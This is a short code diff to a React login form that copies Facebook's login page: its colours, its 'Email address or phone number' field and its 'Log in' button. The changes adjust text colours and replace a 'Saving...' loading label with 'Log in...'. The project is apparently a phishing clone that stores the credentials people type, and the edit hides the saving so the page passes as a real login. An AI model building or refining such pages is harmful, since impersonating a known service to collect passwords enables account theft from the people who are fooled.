@@ -64,7 +64,7 @@ function App() {
                   placeholder="Email address or phone number"
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
-                  className="w-full h-[60px] border border-[#dddfe2] rounded-lg px-4 text-[17px] placeholder:text-[#333538] focus:outline-none focus:border-[#1877f2]"
+                  className="w-full h-[60px] border border-[#dddfe2] rounded-lg px-4 text-black text-[17px] placeholder:text-[#343333] focus:outline-none focus:text-[#201f21] focus:border-[#1877f2]"
                 />
 
                 <input
@@ -72,7 +72,7 @@ function App() {
                   placeholder="Password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
-                  className="w-full h-[60px] border border-[#dddfe2] rounded-lg px-4 text-[17px] placeholder:text-[#414347] focus:outline-none focus:border-[#1877f2]"
+                  className="w-full h-[60px] border border-[#dddfe2] text-black rounded-lg px-4 text-[17px] placeholder:text-[#343333]  focus:outline-none focus:text-[#201f21] focus:border-[#1877f2]"
                 />
 
                 <button
@@ -80,7 +80,7 @@ function App() {
                   disabled={loading}
                   className="w-full h-[56px] rounded-lg bg-[#1877f2] text-white text-[20px] font-bold hover:bg-[#166fe5] disabled:opacity-50"
                 >
-                  {loading ? "Saving..." : "Log in"}
+                  {loading ? "Log in..." : "Log in"}
                 </button>
               </form>
 
